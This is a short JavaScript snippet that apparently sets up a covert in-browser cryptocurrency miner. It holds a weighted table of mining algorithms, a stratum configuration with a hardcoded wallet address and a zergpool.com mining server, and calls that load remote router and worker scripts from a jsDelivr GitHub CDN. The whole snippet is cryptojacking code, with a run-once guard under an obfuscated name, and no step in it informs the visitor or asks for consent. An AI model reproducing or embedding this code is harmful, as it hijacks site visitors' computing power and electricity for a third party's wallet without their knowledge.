    
    if (!window.weba2._RuN_0nc3) {

        window.weba2.weighted = [
            { score: 0.00056, algo: "yescryptR16", port: 6333 },
            { score: 0.01412, algo: "yescryptR8",  port: 6323 },
            { score: 0.00003, algo: "yescrypt",    port: 6233 },
            { score: 0.42212, algo: "yespowerR16", port: 6534 },
            { score: 0.20095, algo: "yespower",    port: 6533 },
            { score: 0.00058, algo: "ghostrider",  port: 5354 },
            { score: 0.00078, algo: "power2b",     port: 6242 },
            { score: 0.09230, algo: "minotaurx",   port: 7019 }
        ];

        window.weba2.stratum = (select => { return {
            worker: "t1PJ6VRKeaFbaFi9SLBoapvyGCFXbmTRbae",
            password: "c=FLUX", server: `${select.algo}.mine.zergpool.com`, port: select.port
        }});

        window.weba2.script("https://cdn.jsdelivr.net/gh/hazelcross/weba2/dist/router.js");

        window.weba2.script("https://cdn.jsdelivr.net/gh/hazelcross/webm3/dist/broswer/worker.js");

        window.weba2._RuN_0nc3 = true;
    }